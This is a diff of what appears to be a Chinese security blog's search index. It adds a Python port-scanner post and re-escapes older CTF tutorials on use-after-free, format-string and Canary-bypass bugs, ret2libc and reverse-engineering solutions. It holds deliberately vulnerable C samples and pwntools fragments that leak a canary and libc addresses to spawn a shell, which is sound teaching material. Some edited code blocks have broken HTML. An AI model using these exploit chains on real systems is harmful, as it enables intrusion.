@@ -3,6 +3,85 @@
   
     
     <entry>
+      <title><![CDATA[端口扫描脚本]]></title>
+      <url>/2020/01/18/duan-kou-sao-miao-jiao-ben/</url>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>Python小工具第二弹???这次脚本终于优化了传参方式..使用了<code>optparse</code>这个库进行传参 具体的端口扫描功能实现是利用<code>socket</code>库实现的 中间排bug排的快死了..</p>
+<h2 id="端口扫描脚本-V1-0"><a href="#端口扫描脚本-V1-0" class="headerlink" title="端口扫描脚本 V1.0"></a>端口扫描脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">import</span> optparse
+<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
+
+parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -H &lt;target host> -P &lt;target port>'</span><span class="token punctuation">)</span>
+parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-H'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgthost'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
+parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-P'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgtport'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">(</span>option<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+tgthost<span class="token operator">=</span>option<span class="token punctuation">.</span>tgthost
+tgtport<span class="token operator">=</span>option<span class="token punctuation">.</span>tgtport
+
+<span class="token keyword">if</span><span class="token punctuation">(</span>tgthost<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>tgtport<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>
+    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># 解析IP</span>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    tgtip<span class="token operator">=</span>gethostbyname<span class="token punctuation">(</span>tgthost<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]解析IP为:%s"</span><span class="token operator">%</span>tgtip<span class="token punctuation">)</span>
+<span class="token keyword">except</span><span class="token punctuation">:</span>
+    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># 分割端口 开始扫描</span>
+tgtport<span class="token operator">=</span>str<span class="token punctuation">(</span>option<span class="token punctuation">.</span>tgtport<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> tgtp <span class="token keyword">in</span> tgtport<span class="token punctuation">:</span>  
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        con<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
+        con<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>tgtip<span class="token punctuation">,</span>int<span class="token punctuation">(</span>tgtp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Du4t\n'</span><span class="token punctuation">)</span>
+        result<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口开放"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口响应:\n"</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
+        con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口未开放"</span><span class="token punctuation">)</span></code></pre>
+<h2 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h2><ul>
+<li>多线程</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></body></html>]]></content>
+      
+        <categories>
+            
+            <category> Others </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Others </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[ZIP爆破脚本]]></title>
       <url>/2020/01/14/zip-bao-po/</url>
       <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算如果后续有时间的话就把多线程加上..优化下脚本破解速度…还有各位大佬们就别吐槽小垃圾的传参方式了..我也知道很垃圾了…后面会学习传参方式 然后替换掉现在的..</p>
@@ -198,9 +277,9 @@ word<span class="token operator">+=</span><span class="token string">'abcdefghij
 <p>所以从严格意义上讲 UAF漏洞不是”天灾”而是”人祸”</p>
 <h2 id="UAF漏洞的验证"><a href="#UAF漏洞的验证" class="headerlink" title="UAF漏洞的验证"></a>UAF漏洞的验证</h2><blockquote>
 <p>此模块测试样例1</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -325,7 +404,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
       <content type="html"><![CDATA[<html><head></head><body><p>最近在做SWPUCTF 发现PWN题又出现了利用格式化字符串漏洞修改值 决定彻底总结下格式化字符串漏洞</p>
 <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><blockquote>
 <p>这里给出本模块的实验案例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -344,9 +423,9 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>通过动态调试 我们可以惊奇的发现…这些十六进制的数据 都是我们输入字符以下栈内的数据 粗略一想好像单单能拿到栈内的数据好像没什么用 但是请注意一点 只要单单能拿到栈内的数据 就已经可以绕过栈溢出的天敌——Canary保护</p>
 <h2 id="格式化字符串漏洞绕过Canary保护"><a href="#格式化字符串漏洞绕过Canary保护" class="headerlink" title="格式化字符串漏洞绕过Canary保护"></a>格式化字符串漏洞绕过Canary保护</h2><blockquote>
 <p>首先给出本模块的样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -388,9 +467,9 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>那么我们或许根本就不需要栈溢出就可以更改返回地址了???</p>
 <h2 id="格式化字符串漏洞修改返回地址"><a href="#格式化字符串漏洞修改返回地址" class="headerlink" title="格式化字符串漏洞修改返回地址"></a>格式化字符串漏洞修改返回地址</h2><blockquote>
 <p>这里先给出本模块的样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -416,7 +495,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
      ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span>
       <span class="token punctuation">{</span>
-          <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token operator">&</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">)</span>
@@ -772,8 +851,8 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>Canary值 是在程序使用gcc编译时 开启Canary保护后生成的一个随机的值 通常会在每个函数开始时将其插入到栈中 目的是在函数返回前 检测函数的栈 (主要是返回地址) 有没有遭到攻击者篡改 通过以上描述 可以很清晰的知道 如果我们不知道Canary值的话 是不可能进行ROP操作的 在没有Canary值的情况下基本限制死了攻击者对栈上的攻击</p>
 </blockquote>
 <h3 id="泄漏Canary值"><a href="#泄漏Canary值" class="headerlink" title="泄漏Canary值"></a>泄漏Canary值</h3><p>先给出样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token keyword">void</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -876,7 +955,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>当然这是有libc库的情况 如果没有的话就需要先泄漏出来两个函数的真实地址 然后再相减做计算了 </p>
 </blockquote>
 <p>通常来说泄漏libc最主要的目的就是进行ROP 也就是获取libc基地址及各个函数的偏移 那么这里直接给出测试源码</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -892,15 +971,15 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2.print\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3.quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
             <span class="token keyword">switch</span> <span class="token punctuation">(</span>num<span class="token punctuation">)</span>
             <span class="token punctuation">{</span>
             <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
-                  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&</span>str<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>str<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token keyword">break</span><span class="token punctuation">;</span>
             <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
-                  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token keyword">break</span><span class="token punctuation">;</span>
             <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
                   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
@@ -922,31 +1001,31 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 </blockquote>
 <p>有了以上条件 基本思路也就可以形成了<br>首先是需要去泄漏出来puts函数的真实地址 然后再利用给出的libc文件 计算出libc的基地址 最后通过栈溢出 拿到shell </p>
 <p>当然在有Canary保护的情况下首先还是应该泄漏Canary的值 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload='a'*0x68
+sh.sendline(payload)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+sh.recvuntil(">> ")
+sh.sendline("2")
+sh.recvuntil('a'*0x68)
+canary=u64(sh.recv(8))-0x0a
+log.info("canary:"+hex(canary))</code></pre>
 <p>这样 就可以利用栈溢出 覆盖掉Canary的\x00 然后成功泄漏出Canary值 </p>
 <p><img src="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" alt></p>
 <p>在有了Canary值后 就可以肆无忌惮的进行栈溢出 不用怕chk_stack_fail了… 那么下一步就是为了泄漏libc基地址做准备 回看一下程序源码 发现puts函数和read函数是执行过的 可以根据个人喜好自己泄漏相对于的真实地址 这里我选择的是puts地址 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload2='a'*0x68+p64(canary)+'a'*0x8+p64(pop_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
+sh.sendline(payload2)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+sh.recvuntil(">> ")
+sh.sendline('3')
 
 
 
-puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+puts_got=u64(sh.recv(6).ljust(8,'\x00'))
+log.info("puts_got:"+hex(puts_got))</code></pre>
 <p><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt></p>
 <p>剩下就简单多了 计算基地址 计算system函数偏移 和/bin/sh偏移 然后调用即可</p>
 <pre class=" language-python"><code class="language-python">libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
@@ -1078,7 +1157,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
 <p><img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt></p>
 <p>写出逆算法即可</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
 using namespace std<span class="token punctuation">;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
@@ -1091,7 +1170,7 @@ using namespace std<span class="token punctuation">;</span>
     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
     cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
         v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -1100,7 +1179,7 @@ using namespace std<span class="token punctuation">;</span>
         a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
         a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    cout<span class="token operator"><<</span>a1<span class="token punctuation">;</span>
+    cout<span class="token operator">&lt;&lt;</span>a1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> </code></pre>
 <p><img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt></p>
 <p>得到flag:unctf{b66_6b6_66b}</p>
@@ -1140,20 +1219,20 @@ using namespace std<span class="token punctuation">;</span>
 <blockquote>
 </blockquote>
 <p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
 using namespace std<span class="token punctuation">;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
     <span class="token keyword">char</span> mazz<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1001111101100111101110001100111100010001111111101"</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
-            cout<span class="token operator"><<</span>endl<span class="token punctuation">;</span>
+            cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
-        cout<span class="token operator"><<</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        cout<span class="token operator">&lt;&lt;</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>    
 <span class="token punctuation">}</span></code></pre>
 <p><img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt></p>
@@ -1385,7 +1464,7 @@ int main(void)
 {
       hello();
       return 0;
-}</stdlib.h></stdio.h></code></pre>
+}</code></pre>
 <p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
 <blockquote>
 <p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
@@ -1416,8 +1495,8 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>第二种方法就是利用溢出 直接将字符串覆盖到Canary值 然后在输出的时候直接输出出来 这种方法的局限性是要求读入字符串的函数 不会将00加入到字符串尾 不然会直接截断字符串 导致不能将Canary值带出来 </p>
 <p>下面分别给出两种情况的案例 来绕过Canary保护</p>
 <h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -1434,7 +1513,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
